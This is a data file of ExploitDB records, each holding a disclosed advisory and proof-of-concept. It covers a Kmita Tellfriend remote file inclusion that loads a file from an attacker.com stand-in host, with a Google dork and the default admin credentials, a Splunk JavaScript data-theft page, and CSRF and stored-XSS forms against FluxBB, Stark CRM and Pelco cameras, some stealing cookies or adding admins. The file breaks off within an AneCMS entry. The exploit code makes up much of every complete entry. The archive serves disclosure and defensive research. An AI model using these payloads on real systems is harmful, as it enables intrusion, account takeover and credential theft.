{u'code': u'____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_93$2008\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_93$2008]   Kmita Tellfriend <= 2.0 (file) Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : May, 5 th 2008\r\nLocation       : Jakarta, Indonesia\r\nWeb            : http://advisories.echo.or.id/adv/adv93-K-159-2008.txt\r\nCritical Lvl   : High\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : Kmita Tellfriend\r\nversion       : <= 2.0\r\nVendor        : http://www.kmita-tellfriend.com/\r\nDescription   :\r\n\r\nUtilize your website\'s maximum capacity. Harness your existing visitor turnover itself to increase your website traffic.\r\nWell, this is what Kmita Tell Friend v2 is all about. Kmita Tell Friend installs easily and lets you provide a link on your website so that your visitors can recommend your website to their friends.\r\nThere are lots of options and customizations ranging from specifying the success page to dynamically specifying the page URL. Kmita Tell Friend can handle unlimited number of recommend forms in one installation itself, that means you need not copy the script over and over again for different recommend forms\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nInput passed to the "file" parameter in htmlcode.php is not properly verified before being used to include files. \r\nThis can be exploited to include arbitrary files from local or external resources.\r\nSuccessful exploitation requires that "register_globals" is enabled.\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/kmitaadmin/kmitat/htmlcode.php?file=http://attacker.com/evil?\r\n\r\nNote: sometimes need to login first.the default user & password are admin\r\n\r\n\r\nDork:\r\n~~~~\r\nGoogle    : "Powered by Kmita Tell Friend" "allinurl:/kmitat/"\r\n \r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn off register_globals in php.ini\r\n \r\n\r\nTimeline:\r\n~~~~~~~~\r\n\r\n- 02 - 05 - 2008 bug found\r\n- 05 - 05 - 2008 vendor contacted\r\n- 05 - 05 - 2008 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke\r\n~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b\r\n~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n~ special for rgod - good bye mate, thanks for the great works.\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2008-05-05]', u'description': u"Kmita Tellfriend 2.0 - 'file' Remote File Inclusion", u'platform': u'php', u'author': u'K-159', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-05-05T00:00:00+00:00', u'_id': 5544, u'type': u'webapps', u'port': 0}

CVE: [u'CVE-2017-5607']
Description: Splunk Enterprise - Information Disclosure
{u'code': u'[+] Credits: John Page AKA hyp3rlinx\t\r\n[+] Website: hyp3rlinx.altervista.org\r\n[+] Source:  http://hyp3rlinx.altervista.org/advisories/SPLUNK-ENTERPRISE-INFORMATION-THEFT.txt\r\n[+] ISR: ApparitionSec            \r\n \r\n\r\n\r\nVendor:\r\n===============\r\nwww.splunk.com\r\n\r\n\r\n\r\nProduct:\r\n==================\r\nSplunk Enterprise \r\n\r\n\r\nSplunk provides the leading platform for Operational Intelligence. Customers use Splunk to search, monitor, analyze\r\nand visualize machine data. Splunk Enterprise, collects and analyzes high volumes of machine-generated data.\r\n\r\n\r\n\r\nVulnerability Type:\r\n==================================\r\nJavascript (JSON) Information Theft\r\n\r\n\r\n\r\nCVE Reference:\r\n==============\r\nCVE-2017-5607\r\n\r\n\r\n\r\nSecurity Issue:\r\n================\r\nAttackers can siphon information from Splunk Enterprise if an authenticated Splunk user visits a malicious webpage.\r\nSome useful data gained is the currently logged in username and if remote user setting is enabled. After, the username\r\ncan be use to Phish or Brute Force Splunk Enterprise login. Additional information stolen may aid in furthering attacks.\r\n\r\nRoot cause is the global Window JS variable assignment of config?autoload=1 \'$C\'.\r\n\r\ne.g.\r\n\r\nwindow.$C = {"BUILD_NUMBER": 207789, "SPLUNKD_PATH"... etc... }\r\n\r\nTo steal information we simply can define a function to be called when the \'$C\' JS property is "set" on webpage, for example.\r\nObject.defineProperty( Object.prototype, "$C", { set:function(val){...\r\n\r\nThe Object prototype is a Object that every other object inherits from in JavaScript, if we create a setter on the name of our target\r\nin this case "$C", we can get/steal the value of this data, in this case it is very easy as it is assigned to global Window namespace.\r\n\r\n\r\nAffected Splunk Enterprise versions:\r\n6.5.x before 6.5.3\r\n6.4.x before 6.4.6\r\n6.3.x before 6.3.10\r\n6.2.x before 6.2.13.1\r\n6.1.x before 6.1.13\r\n6.0.x before 6.0.14\r\n5.0.x before 5.0.18 and Splunk Light before 6.5.2\r\n\r\nVulnerability could allow a remote attacker to obtain logged-in username and Splunk version-related information via JavaScript.\r\n\r\n\r\nReferences:\r\n=============\r\nhttps://www.splunk.com/view/SP-CAAAPZ3\r\nhttps://www.splunk.com/view/SP-CAAAPZ3#InformationLeakageviaJavaScriptCVE20175607\r\n\r\n\r\n\r\nExploit/POC:\r\n=============\r\n\r\nReproduction:\r\n\r\n1) Log into Splunk\r\n2) place the below Javascript in webpage on another server.\r\n\r\n"Splunk-Data-Theft.html"  \r\n\r\n<script>\r\nObject.defineProperty( Object.prototype, "$C", { set:function(val){ \r\n   //prompt("Splunk Timed out:\\nPlease Login to Splunk\\nUsername: "+val.USERNAME, "Password")\r\nfor(var i in val){\r\n alert(""+i+" "+val[i]);\r\n  }\r\n }\r\n});\r\n</script>\r\n\r\n\r\n<script src="https://VICTIM-IP:8000/en-US/config?autoload=1"></script>\r\n\r\n\r\n3) Visit the server hosting the "Splunk-Data-Theft.html" webpage, grab current authenticated user\r\n4) Phish or brute force the application.\r\n\r\n\r\n\r\nVideo POC URL:\r\n===============\r\nhttps://vimeo.com/210634562\r\n\r\n\r\n\r\nNetwork Access:\r\n===============\r\nRemote\r\n\r\n\r\n\r\nImpact:\r\n=======================\r\nInformation Disclosure\r\n\r\n\r\n\r\nSeverity:\r\n=========\r\nMedium\r\n\r\n\r\n\r\nDisclosure Timeline:\r\n===================================================\r\nVendor Notification:  November 30, 2016\r\nVendor Acknowledgement: December 2, 2016\r\nVendor Release Splunk 6.5.3 / Patch : March 30, 2017\r\nMarch 31, 2017  : Public Disclosure\r\n\r\n\r\n\r\n[+] Disclaimer\r\nThe information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.\r\nPermission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and\r\nthat due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit\r\nis given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility\r\nfor any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information\r\nor exploits by the author or elsewhere. All content (c).', u'description': u'Splunk Enterprise - Information Disclosure', u'platform': u'multiple', u'author': u'hyp3rlinx', u'cve': [u'CVE-2017-5607'], u'source': u'ExploitDB', u'date': u'2017-03-31T00:00:00+00:00', u'_id': 41779, u'type': u'webapps', u'port': 0}

CVE: []
Description: FluxBB 1.5.3 - Multiple Vulnerabilities
{u'code': u'<!--\r\n\r\nFluxBB 1.5.3 Multiple Remote Vulnerabilities\r\n\r\n\r\nVendor: FluxBB\r\nProduct web page: http://www.fluxbb.org\r\nAffected version: 1.5.3\r\n\r\nSummary: FluxBB is fast, light, user-friendly forum software for your website.\r\n\r\nDesc: FluxBB suffers from a cross-site scripting, cross-site request forgery\r\nand URL redirect vulnerability. The application allows users to perform certain\r\nactions via HTTP requests without performing any validity checks to verify the\r\nrequests. This can be exploited to perform certain actions with administrative\r\nprivileges if a logged-in user visits a malicious web site. Input passed via the\r\n\'redirect_url\' parameter in \'misc.php\' script is not properly verified before\r\nbeing used to redirect users. This can be exploited to redirect a user to an\r\narbitrary website e.g. when a user clicks a specially crafted link to the\r\naffected script hosted on a trusted domain. It also fails to properly sanitize\r\nuser-supplied input to the \'form[board_title]\' POST parameter in the \'admin_options.php\'\r\nscript. Attackers can exploit this weakness to execute arbitrary HTML and script\r\ncode in a user\'s browser session.\r\n\r\nTested on: Microsoft Windows 7 Ultimate SP1 (EN)\r\n           Apache 2.4.2 (Win32)\r\n           PHP 5.4.7\r\n           MySQL 5.5.25a\r\n\r\n\r\nVulnerabilities discovered by Gjoko \'LiquidWorm\' Krstic\r\n                              @zeroscience\r\n\r\n\r\nAdvisory ID: ZSL-2013-5150\r\nAdvisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5150.php\r\n\r\n\r\n\r\n27.07.2013\r\n\r\n-->\r\n\r\n\r\n<html>\r\n<head>\r\n<title>FluxBB 1.5.3 Multiple Remote Vulnerabilities</title>\r\n</head>\r\n<body><center><br />\r\n<form method="POST" action="http://localhost/fluxbb/admin_options.php">\r\n<input type="hidden" name="form_sent" value="1" />\r\n<input type="hidden" name="form[board_title]" value=\'<script>alert(1)</script>\' />\r\n<input type="hidden" name="form[base_url]" value="http://localhost/fluxbb" />\r\n<input type="hidden" name="form[default_timezone" value="0" />\r\n<input type="hidden" name="form[default_dst" value="0" />\r\n<input type="hidden" name="form[default_lang" value="English" />\r\n<input type="hidden" name="form[default_style" value="Air" />\r\n<input type="hidden" name="form[time_format" value="H:i:s" />\r\n<input type="hidden" name="form[date_format" value="Y-m-d" />\r\n<input type="hidden" name="form[timeout_visit" value="1800" />\r\n<input type="hidden" name="form[timeout_online" value="300" />\r\n<input type="hidden" name="form[redirect_delay" value="1" />\r\n<input type="hidden" name="form[show_version" value="0" />\r\n<input type="hidden" name="form[show_user_info" value="1" />\r\n<input type="hidden" name="form[show_post_count" value="1" />\r\n<input type="hidden" name="form[smilies]" value="1" />\r\n<input type="hidden" name="form[smilies_sig" value="1" />\r\n<input type="hidden" name="form[make_links" value="1" />\r\n<input type="hidden" name="form[topic_review" value="15" />\r\n<input type="hidden" name="form[disp_topics_default" value="30" />\r\n<input type="hidden" name="form[disp_posts_default" value="25" />\r\n<input type="hidden" name="form[indent_num_spaces" value="4" />\r\n<input type="hidden" name="form[quote_depth" value="3" />\r\n<input type="hidden" name="form[quickpost" value="1" />\r\n<input type="hidden" name="form[users_online" value="1" />\r\n<input type="hidden" name="form[censoring" value="0" />\r\n<input type="hidden" name="form[signatures" value="1" />\r\n<input type="hidden" name="form[show_dot" value="0" />\r\n<input type="hidden" name="form[topic_views" value="1" />\r\n<input type="hidden" name="form[quickjump" value="1" />\r\n<input type="hidden" name="form[gzip" value="0" />\r\n<input type="hidden" name="form[search_all_forums" value="0" />\r\n<input type="hidden" name="form[additional_navlinks" value="" />\r\n<input type="hidden" name="form[feed_type" value="2" />\r\n<input type="hidden" name="form[feed_ttl" value="0" />\r\n<input type="hidden" name="form[report_method" value="0" />\r\n<input type="hidden" name="form[mailing_list" value="lab@zeroscience.mk" />\r\n<input type="hidden" name="form[avatars" value="1" />\r\n<input type="hidden" name="form[avatars_dir" value="img/avatars" />\r\n<input type="hidden" name="form[avatars_width" value="60" />\r\n<input type="hidden" name="form[avatars_height" value="60" />\r\n<input type="hidden" name="form[avatars_size" value="10240" />\r\n<input type="hidden" name="form[admin_email" value="lab@zeroscience.mk" />\r\n<input type="hidden" name="form[webmaster_email" value="lab@zeroscience.mk" />\r\n<input type="hidden" name="form[forum_subscriptions" value="1" />\r\n<input type="hidden" name="form[topic_subscriptions" value="1" />\r\n<input type="hidden" name="form[smtp_host" value="" />\r\n<input type="hidden" name="form[smtp_user" value="" />\r\n<input type="hidden" name="form[smtp_pass1" value="" />\r\n<input type="hidden" name="form[smtp_pass2" value="" />\r\n<input type="hidden" name="form[smtp_ssl" value="0" />\r\n<input type="hidden" name="form[regs_allow" value="1" />\r\n<input type="hidden" name="form[regs_verify" value="0" />\r\n<input type="hidden" name="form[regs_report" value="0" />\r\n<input type="hidden" name="form[rules" value="0" />\r\n<input type="hidden" name="form[rules_message" value="Enter+your+rules+here" />\r\n<input type="hidden" name="form[default_email_setting" value="1" />\r\n<input type="hidden" name="form[announcement" value="0" />\r\n<input type="hidden" name="form[announcement_message" value="Enter+your+announcement+here." />\r\n<input type="hidden" name="form[maintenance" value="0" />\r\n<input type="hidden" name="form[maintenance_message" value="Forum Down!" />\r\n<input type="hidden" name="save" value="Save+changes" />\r\n<input type="submit" value="XSS" />\r\n</form>\r\n<br />\r\n<form method="POST" action="http://localhost/fluxbb/misc.php?email=2">\r\n<input type="hidden" name="form_sent" value="1" />\r\n<input type="hidden" name="redirect_url" value="http://www.zeroscience.mk" />\r\n<input type="hidden" name="req_message" value="Follow the Spirit" />\r\n<input type="hidden" name="req_subject" value="ZSL" />\r\n<input type="hidden" name="submit" value="Submit" />\r\n<input type="submit" value="Forge and Redirect" />\r\n</form>\r\n</body>\r\n</html>', u'description': u'FluxBB 1.5.3 - Multiple Vulnerabilities', u'platform': u'php', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-07-29T00:00:00+00:00', u'_id': 27190, u'type': u'webapps', u'port': 0}

CVE: []
Description: Stark CRM 1.0 - Multiple Vulnerabilities
{u'code': u'\ufeff\r\nStark CRM v1.0 Multiple Script Injection And Session Riding Vulnerabilities\r\n\r\n\r\nVendor: IWCn Systems Inc.\r\nProduct web page: http://www.iwcn.ws\r\nAffected version: 1.0\r\n\r\nSummary: This is a light weight CRM which simplifies process\r\nof managing staff, client and projects.\r\n\r\nDesc: Multiple stored XSS and CSRF vulnerabilities exist when\r\nparsing user input to several POST parameters. The application\r\nallows users to perform certain actions via HTTP requests without\r\nperforming any validity checks to verify the requests. This\r\ncan be exploited to perform certain actions with administrative\r\nprivileges if a logged-in user visits a malicious web site and/or\r\nexecute arbitrary HTML and script code in a user\'s browser session.\r\n\r\nTested on: Nginx, PHP, MySQL\r\n\r\n\r\nVulnerabilities discovered by Gjoko \'LiquidWorm\' Krstic\r\n                              @zeroscience\r\n\r\n\r\nAdvisory ID: ZSL-2014-5169\r\nAdvisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5169.php\r\n\r\n\r\n03.02.2014\r\n\r\n--\r\n\r\n\r\nCSRF (Add Admin):\r\n################\r\n\r\n<html>\r\n<!--\r\nhttp://lab17.zeroscience.mk/testing/index.php?page=admin     - Add Admin\r\nhttp://lab17.zeroscience.mk/testing/index.php?page=agent     - Add Agent\r\nhttp://lab17.zeroscience.mk/testing/index.php?page=sub_agent - Add Sub-Agent\r\nhttp://lab17.zeroscience.mk/testing/index.php?page=partner   - Add Partner\r\nhttp://lab17.zeroscience.mk/testing/index.php?page=client    - Add Client\r\n-->\r\n  <body>\r\n    <form action="http://lab17.zeroscience.mk/testing/index.php?page=admin" method="POST">\r\n      <input type="hidden" name="first_name" value="Admin101" />\r\n      <input type="hidden" name="last_name" value="Admin202" />\r\n      <input type="hidden" name="comp_name" value="Zero Science Lab" />\r\n      <input type="hidden" name="email" value="lab@zeroscience.mk" />\r\n      <input type="hidden" name="pwd" value="123456" />\r\n      <input type="hidden" name="phonep" value="(111) 111-1111" />\r\n      <input type="hidden" name="phoneg" value="(111) 111-1111" />\r\n      <input type="hidden" name="notes" value="Testing2 Address 101" />\r\n      <input type="hidden" name="zip" value="11111" />\r\n      <input type="hidden" name="ahv" value="11111" />\r\n      <input type="hidden" name="date" value="03.02.2014" />\r\n      <input type="hidden" name="gender" value="female" />\r\n      <input type="hidden" name="f_status" value="Married" />\r\n      <input type="hidden" name="detail" value="Testing3 personal detailz" />\r\n      <input type="hidden" name="submit" value="" />\r\n      <input type="submit" value="Submit form" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n\r\n\r\n\r\nStored XSS (parameter: name):\r\n############################\r\n\r\nPOST /testing/index.php?page=add_ticket HTTP/1.1\r\nHost: lab17.zeroscience.mk\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://lab17.zeroscience.mk/testing/index.php?page=add_ticket\r\nCookie: PHPSESSID=51422dfc2ef2d3569e778d06d20c7a25\r\nConnection: keep-alive\r\nContent-Type: multipart/form-data; boundary=---------------------------94321629522129\r\nContent-Length: 592\r\n\r\n-----------------------------94321629522129\r\nContent-Disposition: form-data; name="name"\r\n\r\n"><script>alert(1);</script>\r\n-----------------------------94321629522129\r\nContent-Disposition: form-data; name="project"\r\n\r\n1\r\n-----------------------------94321629522129\r\nContent-Disposition: form-data; name="description"\r\n\r\nZSL\r\n-----------------------------94321629522129\r\nContent-Disposition: form-data; name="file"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------94321629522129\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\r\n-----------------------------94321629522129--\r\n\r\n\r\n\r\n\r\nStored XSS (parameters: first_name, last_name, notes):\r\n#####################################################\r\n\r\n<html>\r\n  <body>\r\n    <form action="http://lab17.zeroscience.mk/testing/index.php?page=client" method="POST">\r\n      <input type="hidden" name="first_name" value=\'"><script>alert(document.cookie);</script>\' />\r\n      <input type="hidden" name="last_name" value=\'"><script>alert(document.cookie);</script>\' />\r\n      <input type="hidden" name="comp_name" value="Zero Science Lab" />\r\n      <input type="hidden" name="email" value="lab@zeroscience.mk" />\r\n      <input type="hidden" name="pwd" value="test" />\r\n      <input type="hidden" name="phonep" value="(111) 111-1111" />\r\n      <input type="hidden" name="phoneg" value="(111) 111-1111" />\r\n      <input type="hidden" name="notes" value=\'"><script>alert(document.cookie);</script>\' />\r\n      <input type="hidden" name="zip" value="00000" />\r\n      <input type="hidden" name="ahv" value="test2" />\r\n      <input type="hidden" name="date" value="03.02.2014" />\r\n      <input type="hidden" name="gender" value="male" />\r\n      <input type="hidden" name="f_status" value="Single" />\r\n      <input type="hidden" name="detail" value="test" />\r\n      <input type="hidden" name="submit" value="" />\r\n      <input type="submit" value="Submit form" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n\r\n\r\n\r\nStored XSS (parameters: insu_name, price):\r\n#########################################\r\n\r\n<html>\r\n  <body>\r\n    <form action="http://lab17.zeroscience.mk/testing/index.php?page=add_insurance_cat" method="POST">\r\n      <input type="hidden" name="insu_name" value=\'"><script>alert(document.cookie);</script>\' />\r\n      <input type="hidden" name="price" value=\'"><script>alert(document.cookie);</script>\' />\r\n      <input type="hidden" name="submit" value="" />\r\n      <input type="submit" value="Submit form" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n\r\n\r\n\r\nStored XSS (parameter: status[]):\r\n################################\r\n\r\n<html>\r\n  <body>\r\n    <form action="http://lab17.zeroscience.mk/testing/index.php?page=add_status" method="POST">\r\n      <input type="hidden" name="status[]" value=\'"><script>alert(document.cookie);</script>\' />\r\n      <input type="hidden" name="submit" value="" />\r\n      <input type="submit" value="Submit form" />\r\n    </form>\r\n  </body>\r\n</html>', u'description': u'Stark CRM 1.0 - Multiple Vulnerabilities', u'platform': u'php', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2014-02-20T00:00:00+00:00', u'_id': 31792, u'type': u'webapps', u'port': 80}

CVE: []
Description: Pelco Sarix/Spectra Cameras - Cross-Site Request Forgery / Cross-Site Scripting
{u'code': u'Schneider Electric Pelco Sarix/Spectra Cameras Multiple XSS Vulnerabilities\r\n\r\n\r\nVendor: Schneider Electric SE\r\nProduct web page: https://www.pelco.com\r\nAffected version: Sarix Enhanced - Model: IME219 (Firmware: 2.1.2.0.8280-A0.0)\r\n                  Sarix Enhanced - Model: IME119 (Firmware: 2.1.2.0.8280-A0.0)\r\n                  Sarix - Model: D5230 (Firmware: 1.9.2.23-20141118-1.9330-A1.10722)\r\n                  Sarix - Model: ID10DN (Firmware: 1.8.2.18-20121109-1.9110-O3.8503)\r\n                  Spectra Enhanced - Model: D6230 (Firmware: 2.2.0.5.9340-A0.0)\r\n\r\nSummary: Pelco offers the broadest selection of IP cameras designed\r\nfor security surveillance in a wide variety of commercial and industrial\r\nsettings. From our industry-leading fixed and high-speed IP cameras to\r\npanoramic, thermal imaging, explosionproof and more, we offer a camera\r\nfor any environment, any lighting condition and any application.\r\nWhen nothing but the best will do. Sarix\u2122 Enhanced Range cameras\r\nprovide the most robust feature-set for your mission-critical applications.\r\nWith SureVision\u2122 3.0, Sarix Enhanced delivers the best possible image\r\nin difficult lighting conditions such as a combination of bright areas,\r\nshaded areas, and intense light. Designed with superior reliability,\r\nfault tolerance, and processing speed, these rugged fixed IP cameras\r\nensure you always get the video that you need.\r\n\r\nDesc: Pelco cameras suffer from multiple dom-based, stored and reflected\r\nXSS vulnerabilities when input passed via several parameters to several\r\nscripts is not properly sanitized before being returned to the user.\r\nThis can be exploited to execute arbitrary HTML and script code in a\r\nuser\'s browser session in context of an affected site.\r\n\r\nTested on: Linux 2.6.10_mvl401-1721-pelco_evolution #1 Tue Nov 18 21:15:30 EST 2014 armv5tejl unknown\r\n           MontaVista(R) Linux(R) Professional Edition 4.0.1 (0600980)\r\n           Lighttpd/1.4.28\r\n           PHP/5.3.0\r\n\r\n\r\nVulnerability discovered by Gjoko \'LiquidWorm\' Krstic\r\n                            @zeroscience\r\n\r\n\r\nAdvisory ID: ZSL-2017-5415\r\nAdvisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5415.php\r\n\r\n\r\n07.04.2017\r\n\r\n--\r\n\r\n\r\nCSRF/XSS on username parameter:\r\n-------------------------------\r\n\r\n<html>\r\n  <body>\r\n  <script>history.pushState(\'\', \'\', \'/\')</script>\r\n    <form action="http://192.168.1.1/setup/network/dot1x/update" method="POST">\r\n      <input type="hidden" name="dot1x" value="on" />\r\n      <input type="hidden" name="protocol" value="EAP&#45;TLS" />\r\n      <input type="hidden" name="inner&#95;auth" value="CHAP" />\r\n      <input type="hidden" name="username" value=\'"><script>alert(1)</script>\' />\r\n      <input type="hidden" name="password" value="blah" />\r\n      <input type="hidden" name="anonymous&#95;id" value="&#13;" />\r\n      <input type="hidden" name="ca&#95;certificate" value="test" />\r\n      <input type="hidden" name="client&#95;certificate" value="test" />\r\n      <input type="hidden" name="private&#95;key" value="test" />\r\n      <input type="hidden" name="private&#95;key&#95;password" value="test" />\r\n      <input type="submit" value="Submit request" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n\r\nCSRF/XSS on gateway, hostname, ip_address, nameservers, http_port, rtsp_port and subnet_mask parameter:\r\n-------------------------------------------------------------------------------------------------------\r\n\r\n<html>\r\n  <body>\r\n  <script>history.pushState(\'\', \'\', \'/\')</script>\r\n    <form action="http://192.168.1.1/setup/network/general/update" method="POST">\r\n      <input type="hidden" name="hostname" value=\'"><script>alert(2)</script>\' />\r\n      <input type="hidden" name="http&#95;port" value=\'"><script>alert(3)</script>\' />\r\n      <input type="hidden" name="rtsp&#95;port" value=\'"><script>alert(4)</script>\' />\r\n      <input type="hidden" name="dhcp" value="off" />\r\n      <input type="hidden" name="ip&#95;address" value=\'"><script>alert(5)</script>\' />\r\n      <input type="hidden" name="subnet&#95;mask" value=\'"><script>alert(6)</script>\' />\r\n      <input type="hidden" name="gateway" value=\'"><script>alert(7)</script>\' />\r\n      <input type="hidden" name="nameservers" value=\'"><script>alert(8)</script>\' />\r\n      <input type="submit" value="Submit request" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n\r\nCSRF/XSS on version parameter:\r\n------------------------------\r\n\r\n<html>\r\n  <body>\r\n  <script>history.pushState(\'\', \'\', \'/\')</script>\r\n    <form action="http://192.168.1.1/setup/network/snmp/update" method="POST">\r\n      <input type="hidden" name="version" value=\'";alert(9)//\' />\r\n      <input type="hidden" name="v2&#95;community&#95;string" value="public" />\r\n      <input type="hidden" name="v2&#95;receiver&#95;address" value="" />\r\n      <input type="hidden" name="v2&#95;trap&#95;community&#95;string" value="trapbratce" />\r\n      <input type="submit" value="Submit request" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n\r\nCSRF/XSS on device_name, ntp_server, region, smtp_server and zone parameter:\r\n----------------------------------------------------------------------------\r\n\r\n<html>\r\n  <body>\r\n  <script>history.pushState(\'\', \'\', \'/\')</script>\r\n    <form action="http://192.168.1.1/setup/system/general/update" method="POST">\r\n      <input type="hidden" name="device&#95;name" value=\'ZSL"><script>alert(10)</script>\' />\r\n      <input type="hidden" name="enable&#95;leds" value="on" />\r\n      <input type="hidden" name="smtp&#95;server" value=\'"><script>alert(11)</script>\' />\r\n      <input type="hidden" name="ntp&#95;server&#95;from&#95;dhcp" value="false" />\r\n      <input type="hidden" name="ntp&#95;server" value="\';alert(12)//\'" />\r\n      <input type="hidden" name="region" value="Macedonia\';alert(13)//" />\r\n      <input type="hidden" name="zone" value="Kumanovo\';alert(14)//" />\r\n      <input type="hidden" name="enable&#95;time&#95;overlay" value="on" />\r\n      <input type="hidden" name="enable&#95;name&#95;overlay" value="off" />\r\n      <input type="hidden" name="position" value="topright" />\r\n      <input type="hidden" name="date&#95;format" value="0" />\r\n      <input type="submit" value="Submit request" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n\r\nXSS on ftp_base_path, ftp_server, ftp_username, ftp_password and name parameter:\r\n--------------------------------------------------------------------------------\r\n\r\n<html>\r\n  <body>\r\n  <script>history.pushState(\'\', \'\', \'/\')</script>\r\n    <form action="http://192.168.1.1/setup/events/handlers/update" method="POST">\r\n      <input type="hidden" name="id" value="" />\r\n      <input type="hidden" name="relay&#95;sentinel" value="relay&#95;sentinel" />\r\n      <input type="hidden" name="name" value=\'"><script>alert(15)</script>\' />\r\n      <input type="hidden" name="type" value="Ftp" />\r\n      <input type="hidden" name="email&#95;to" value="" />\r\n      <input type="hidden" name="email&#95;from" value="" />\r\n      <input type="hidden" name="email&#95;subject" value="" />\r\n      <input type="hidden" name="email&#95;message" value="" />\r\n      <input type="hidden" name="dest&#95;name" value="IMG&#37;m&#37;d&#37;Y&#37;H&#37;M&#37;S&#46;jpg" />\r\n      <input type="hidden" name="limit&#95;size" value="" />\r\n      <input type="hidden" name="limit&#95;size&#95;scale" value="K" />\r\n      <input type="hidden" name="ftp&#95;server" value=\'"><script>alert(16)</script>\' />\r\n      <input type="hidden" name="ftp&#95;username" value=\'"><script>alert(17)</script>\' />\r\n      <input type="hidden" name="ftp&#95;password" value=\'"><script>alert(18)</script>\' />\r\n      <input type="hidden" name="ftp&#95;base&#95;path" value=\'"><script>alert(19)</script>\' />\r\n      <input type="hidden" name="ftp&#95;dest&#95;name" value="IMG&#37;m&#37;d&#37;Y&#37;H&#37;M&#37;S&#46;jpg" />\r\n      <input type="hidden" name="relay&#95;bankName" value="GPIO" />\r\n      <input type="hidden" name="relay&#95;index" value="0" />\r\n      <input type="hidden" name="relay&#95;on&#95;time" value="0&#46;1" />\r\n      <input type="hidden" name="relay&#95;off&#95;time" value="0&#46;1" />\r\n      <input type="hidden" name="relay&#95;pulse&#95;count" value="" />\r\n      <input type="hidden" name="filter&#95;start0" value="" />\r\n      <input type="hidden" name="filter&#95;stop0" value="" />\r\n      <input type="submit" value="Submit request" />\r\n    </form>\r\n  </body>\r\n</html>', u'description': u'Pelco Sarix/Spectra Cameras - Cross-Site Request Forgery / Cross-Site Scripting', u'platform': u'hardware', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2017-07-10T00:00:00+00:00', u'_id': 42307, u'type': u'webapps', u'port': 0}

CVE: []
Description: AneCMS 1.0 - 'index.php' Multiple HTML Injection Vulnerabilities
{u'code': u'source: http://www.securityfocus.com/bid/38657/info\r\n\r\nAneCMS is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.\r\n\r\nSuccessful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.\r\n\r\nAneCMS 1.0 is vulnerable; other versions may also be affected. \r\n\r\n                                     =======================================================================\r\n     \r\n                                                  ANE CMS 1 Persistent XSS Vulnerability\r\n   \r\n                                     =======================================================================\r\n     \r\n                                                                   by\r\n     \r\n                                                              Pratul Agrawal\r\n   \r\n     \r\n     \r\n  # Vulnerability found in- Admin module\r\n     \r\n  # email         Pratulag@yahoo.com\r\n     \r\n  # company       aksitservices\r\n     \r\n  # Credit by     Pratul Agrawal\r\n   \r\n  # Software      ANE CMS 1\r\n  \r\n  # Category      CMS / Portals\r\n  \r\n  # Plateform     php\r\n    \r\n   